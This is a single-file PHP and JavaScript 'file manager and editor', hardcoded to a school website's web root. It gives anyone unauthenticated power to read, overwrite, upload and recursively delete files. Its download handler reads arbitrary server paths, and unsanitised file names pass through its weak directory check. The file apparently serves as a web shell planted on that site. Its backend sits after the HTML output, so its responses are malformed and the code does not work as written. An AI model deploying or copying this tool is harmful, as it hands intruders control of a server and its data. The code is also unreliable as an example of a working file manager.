<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebFM - File Manager &amp; Editor</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.36.2/ace.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Inter', system-ui, sans-serif; }
        .file-list tr:hover { background-color: #f8fafc; }
        .ace_editor { height: 100% !important; }
    </style>
</head>
<body class="bg-gray-50">

<div class="flex h-screen">
    <!-- Sidebar -->
    <div class="w-80 bg-white border-r flex flex-col">
        <div class="p-5 border-b bg-gradient-to-r from-blue-600 to-indigo-600 text-white">
            <div class="flex items-center gap-3">
                <i class="fa-solid fa-hard-drive text-3xl"></i>
                <div>
                    <h1 class="text-2xl font-bold tracking-tight">WebFM</h1>
                    <p class="text-xs opacity-75">PHP File Manager + Editor</p>
                </div>
            </div>
        </div>

        <div class="p-4 border-b">
            <div class="text-xs uppercase tracking-widest text-gray-500 mb-2">Current Directory</div>
            <div id="currentPathDisplay" class="font-mono text-sm bg-gray-100 p-3 rounded-lg break-all"></div>
        </div>

        <div class="flex-1 overflow-auto p-4 text-sm" id="sidebarInfo">
            <!-- populated by JS -->
        </div>

        <div class="p-4 border-t text-xs text-gray-400">
            <button onclick="logout()" class="w-full py-2 hover:bg-red-50 hover:text-red-600 rounded-lg flex items-center justify-center gap-2">
                <i class="fa-solid fa-right-from-bracket"></i> Reset Session
            </button>
        </div>
    </div>

    <!-- Main Area -->
    <div class="flex-1 flex flex-col">
        <!-- Top Bar -->
        <div class="h-16 bg-white border-b flex items-center px-6 gap-4">
            <button onclick="goUp()" class="px-5 py-2 hover:bg-gray-100 rounded-xl flex items-center gap-2 text-sm">
                <i class="fa-solid fa-level-up-alt"></i> Up
            </button>
            <button onclick="refreshFiles()" class="px-5 py-2 hover:bg-gray-100 rounded-xl flex items-center gap-2 text-sm">
                <i class="fa-solid fa-arrows-rotate"></i> Refresh
            </button>

            <div class="flex-1"></div>

            <div class="flex items-center gap-3">
                <button onclick="createNewFile()" 
                        class="px-5 py-2 bg-white border hover:border-gray-400 rounded-xl flex items-center gap-2 text-sm">
                    <i class="fa-solid fa-file-circle-plus"></i> New File
                </button>
                <button onclick="createNewDir()" 
                        class="px-5 py-2 bg-white border hover:border-gray-400 rounded-xl flex items-center gap-2 text-sm">
                    <i class="fa-solid fa-folder-plus"></i> New Folder
                </button>
                <button onclick="showUploadModal()" 
                        class="px-5 py-2 bg-blue-600 text-white rounded-xl flex items-center gap-2 text-sm font-medium">
                    <i class="fa-solid fa-upload"></i> Upload
                </button>
            </div>
        </div>

        <!-- File Table -->
        <div class="flex-1 overflow-auto p-6">
            <table class="w-full file-list min-w-full">
                <thead>
                    <tr class="text-xs font-medium text-gray-500 border-b">
                        <th class="text-left py-4 w-8"></th>
                        <th class="text-left py-4">Name</th>
                        <th class="text-left py-4">Size</th>
                        <th class="text-left py-4">Modified</th>
                        <th class="w-32"></th>
                    </tr>
                </thead>
                <tbody id="fileTable" class="text-sm divide-y"></tbody>
            </table>
        </div>
    </div>
</div>

<!-- Editor Modal -->
<div id="editorModal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-50">
    <div class="bg-white w-[96%] max-w-7xl h-[96%] rounded-3xl shadow-2xl flex flex-col overflow-hidden">
        <div class="px-8 py-5 border-b flex items-center justify-between">
            <div class="flex items-center gap-4">
                <i id="modalIcon" class="fa-solid fa-file text-2xl text-blue-600"></i>
                <div>
                    <div id="modalFilename" class="font-semibold text-lg"></div>
                    <div id="modalFullPath" class="font-mono text-xs text-gray-500"></div>
                </div>
            </div>
            <div class="flex items-center gap-4">
                <button onclick="saveCurrentFile()" 
                        class="px-8 py-3 bg-emerald-600 hover:bg-emerald-700 text-white rounded-2xl flex items-center gap-3 font-medium">
                    <i class="fa-solid fa-floppy-disk"></i>
                    <span>Save (Ctrl+S)</span>
                </button>
                <button onclick="closeEditor()" 
                        class="px-6 py-3 text-gray-500 hover:bg-gray-100 rounded-2xl">
                    <i class="fa-solid fa-xmark text-2xl"></i>
                </button>
            </div>
        </div>
        <div id="aceContainer" class="flex-1"></div>
    </div>
</div>

<!-- Upload Modal -->
<div id="uploadModal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50">
    <div class="bg-white rounded-3xl p-10 w-full max-w-lg">
        <h2 class="text-2xl font-semibold mb-8">Upload File</h2>
        <input type="file" id="fileInput" class="w-full text-sm mb-8">
        <div class="flex gap-4">
            <button onclick="hideUploadModal()" class="flex-1 py-4 border rounded-2xl">Cancel</button>
            <button onclick="uploadSelectedFile()" class="flex-1 py-4 bg-blue-600 text-white rounded-2xl">Upload Now</button>
        </div>
    </div>
</div>

<script>
// PHP Backend communication
const API = window.location.href.split('?')[0]; // Current file URL

let currentPath = '/var/www/vhosts/giekperi.sites.sch.gr/httpdocs/';
let aceEditor = null;
let currentEditingFile = null;

async function apiCall(action, data = {}) {
    const formData = new FormData();
    formData.append('action', action);
    formData.append('path', currentPath);
    
    Object.keys(data).forEach(key => {
        formData.append(key, data[key]);
    });

    try {
        const res = await fetch(API, {
            method: 'POST',
            body: formData
        });
        const result = await res.json();
        if (!result.success) {
            alert("Error: " + (result.error || 'Unknown error'));
        }
        return result;
    } catch(e) {
        console.error(e);
        alert("Request failed");
        return { success: false };
    }
}

async function loadFiles() {
    const tbody = document.getElementById('fileTable');
    tbody.innerHTML = `<tr><td colspan="5" class="text-center py-20"><i class="fa-solid fa-spinner fa-spin text-4xl text-gray-300"></i></td></tr>`;
    
    const result = await apiCall('list');
    
    if (!result.success) {
        tbody.innerHTML = `<tr><td colspan="5" class="text-center py-20 text-red-500">Failed to load directory</td></tr>`;
        return;
    }
    
    document.getElementById('currentPathDisplay').textContent = currentPath;
    
    let html = '';
    result.files.forEach(file => {
        const isDir = file.is_dir;
        const icon = isDir ? 
            `<i class="fa-solid fa-folder text-blue-500 text-xl"></i>` : 
            `<i class="fa-solid fa-file text-gray-400 text-xl"></i>`;
        
        html += `
            <tr class="group hover:bg-blue-50 transition-colors">
                <td class="py-5 px-4">${icon}</td>
                <td class="py-5 font-medium ${isDir ? 'cursor-pointer' : ''}" 
                    onclick="${isDir ? `navigate('${file.name}')` : `editFile('${file.name}')`}">
                    ${file.name}
                </td>
                <td class="py-5 text-gray-500">${isDir ? '—' : formatBytes(file.size)}</td>
                <td class="py-5 text-gray-500 text-sm">${file.modified}</td>
                <td class="py-5">
                    <div class="flex gap-5 opacity-0 group-hover:opacity-100 transition">
                        ${!isDir ? `<button onclick="event.stopImmediatePropagation(); editFile('${file.name}')" class="text-blue-600 hover:text-blue-700"><i class="fa-solid fa-pen"></i></button>` : ''}
                        <button onclick="event.stopImmediatePropagation(); downloadFile('${file.name}')" class="text-blue-600 hover:text-blue-700"><i class="fa-solid fa-download"></i></button>
                        <button onclick="event.stopImmediatePropagation(); deleteItem('${file.name}', ${isDir})" class="text-red-500 hover:text-red-600"><i class="fa-solid fa-trash"></i></button>
                    </div>
                </td>
            </tr>
        `;
    });
    
    tbody.innerHTML = html || `<tr><td colspan="5" class="text-center py-20 text-gray-400">This directory is empty</td></tr>`;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

async function navigate(dir) {
    currentPath = currentPath.replace(/\/$/, '') + '/' + dir;
    await loadFiles();
}

async function goUp() {
    if (currentPath === '/') return;
    currentPath = currentPath.substring(0, currentPath.lastIndexOf('/'));
    if (currentPath === '') currentPath = '/';
    await loadFiles();
}

async function refreshFiles() {
    await loadFiles();
}

async function editFile(filename) {
    const result = await apiCall('read', { file: filename });
    if (!result.success) return;
    
    currentEditingFile = filename;
    
    document.getElementById('modalFilename').textContent = filename;
    document.getElementById('modalFullPath').textContent = currentPath + '/' + filename;
    document.getElementById('editorModal').classList.remove('hidden');
    
    if (!aceEditor) {
        aceEditor = ace.edit("aceContainer");
        aceEditor.setTheme("ace/theme/twilight");
        aceEditor.setFontSize(15);
        aceEditor.getSession().setUseWrapMode(true);
    }
    
    aceEditor.setValue(result.content || '');
    aceEditor.clearSelection();
    
    const ext = filename.split('.').pop().toLowerCase();
    const modes = { js: 'javascript', py: 'python', php: 'php', html: 'html', css: 'css', json: 'json', md: 'markdown' };
    aceEditor.session.setMode(`ace/mode/${modes[ext] || 'text'}`);
}

async function saveCurrentFile() {
    if (!currentEditingFile || !aceEditor) return;
    
    const content = aceEditor.getValue();
    const result = await apiCall('write', { 
        file: currentEditingFile, 
        content: content 
    });
    
    if (result.success) {
        alert("✓ File saved successfully");
        closeEditor();
        loadFiles();
    }
}

function closeEditor() {
    document.getElementById('editorModal').classList.add('hidden');
}

async function deleteItem(name, isDir) {
    if (!confirm(`Delete ${isDir ? 'folder' : 'file'} "${name}" permanently?`)) return;
    
    const result = await apiCall('delete', { item: name, isDir: isDir });
    if (result.success) {
        loadFiles();
    }
}

async function downloadFile(name) {
    const link = document.createElement('a');
    link.href = `${API}?download=1&path=${encodeURIComponent(currentPath)}&file=${encodeURIComponent(name)}`;
    link.download = name;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

function showUploadModal() {
    document.getElementById('uploadModal').classList.remove('hidden');
    document.getElementById('fileInput').value = '';
}

function hideUploadModal() {
    document.getElementById('uploadModal').classList.add('hidden');
}

async function uploadSelectedFile() {
    const input = document.getElementById('fileInput');
    if (!input.files[0]) return alert("Please select a file");
    
    const file = input.files[0];
    const formData = new FormData();
    formData.append('action', 'upload');
    formData.append('path', currentPath);
    formData.append('file', file);
    
    try {
        const res = await fetch(API, { method: 'POST', body: formData });
        const result = await res.json();
        if (result.success) {
            hideUploadModal();
            loadFiles();
            alert("File uploaded successfully");
        }
    } catch(e) {
        alert("Upload failed");
    }
}

async function createNewFile() {
    const name = prompt("New file name (e.g. script.php):");
    if (!name) return;
    
    const result = await apiCall('create', { name: name, isDir: false });
    if (result.success) {
        loadFiles();
        editFile(name);
    }
}

async function createNewDir() {
    const name = prompt("New folder name:");
    if (!name) return;
    
    const result = await apiCall('create', { name: name, isDir: true });
    if (result.success) loadFiles();
}

function logout() {
    if (confirm("Clear current path and refresh?")) {
        currentPath = '/var/www/vhosts/giekperi.sites.sch.gr/httpdocs/';
        loadFiles();
    }
}

// Keyboard support
document.addEventListener('keydown', e => {
    if (e.key === "Escape") {
        const modal = document.getElementById('editorModal');
        if (!modal.classList.contains('hidden')) closeEditor();
    }
    if (e.ctrlKey && e.key === "s") {
        e.preventDefault();
        const modal = document.getElementById('editorModal');
        if (!modal.classList.contains('hidden')) saveCurrentFile();
    }
});

// PHP Backend (embedded)
window.onload = async function() {
    // The PHP part is handled server-side by this same file
    await loadFiles();
};
</script>

<?php
// ====================== PHP BACKEND ======================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $action = $_POST['action'] ?? '';
    $path = $_POST['path'] ?? '/var/www/vhosts/giekperi.sites.sch.gr/httpdocs/';
    
    // Security: stay within base directory
    $base = '/var/www/vhosts/giekperi.sites.sch.gr/httpdocs/';
    if (strpos(realpath($path), realpath($base)) !== 0) {
        $path = $base;
    }
    
    function respond($success, $data = [], $error = '') {
        echo json_encode(array_merge(['success' => $success, 'error' => $error], $data));
        exit;
    }
    
    switch ($action) {
        case 'list':
            $files = [];
            if (is_dir($path)) {
                foreach (scandir($path) as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $full = $path . '/' . $item;
                    $files[] = [
                        'name' => $item,
                        'is_dir' => is_dir($full),
                        'size' => is_dir($full) ? 0 : filesize($full),
                        'modified' => date('Y-m-d H:i', filemtime($full))
                    ];
                }
            }
            respond(true, ['files' => $files]);
            break;
            
        case 'read':
            $file = $path . '/' . $_POST['file'];
            if (file_exists($file) && !is_dir($file)) {
                respond(true, ['content' => file_get_contents($file)]);
            } else {
                respond(false, [], 'File not found');
            }
            break;
            
        case 'write':
            $file = $path . '/' . $_POST['file'];
            if (file_put_contents($file, $_POST['content']) !== false) {
                respond(true);
            } else {
                respond(false, [], 'Write failed');
            }
            break;
            
        case 'delete':
            $item = $path . '/' . $_POST['item'];
            if ($_POST['isDir'] == 'true') {
                $success = rrmdir($item);
            } else {
                $success = unlink($item);
            }
            respond($success);
            break;
            
        case 'create':
            $newPath = $path . '/' . $_POST['name'];
            if ($_POST['isDir']) {
                $success = mkdir($newPath, 0755, true);
            } else {
                $success = touch($newPath);
            }
            respond($success);
            break;
            
        case 'upload':
            if (isset($_FILES['file'])) {
                $dest = $path . '/' . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                    respond(true);
                }
            }
            respond(false);
            break;
    }
    
    respond(false, [], 'Invalid action');
}

// Recursive remove directory
function rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dir . "/" . $object)) {
                    rrmdir($dir . "/" . $object);
                } else {
                    unlink($dir . "/" . $object);
                }
            }
        }
        return rmdir($dir);
    }
    return false;
}

// Download handler
if (isset($_GET['download']) && $_GET['download'] == 1) {
    $path = $_GET['path'] ?? '';
    $file = $_GET['file'] ?? '';
    $full = $path . '/' . $file;
    
    if (file_exists($full) && !is_dir($full)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($full) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($full));
        readfile($full);
        exit;
    }
}
?>
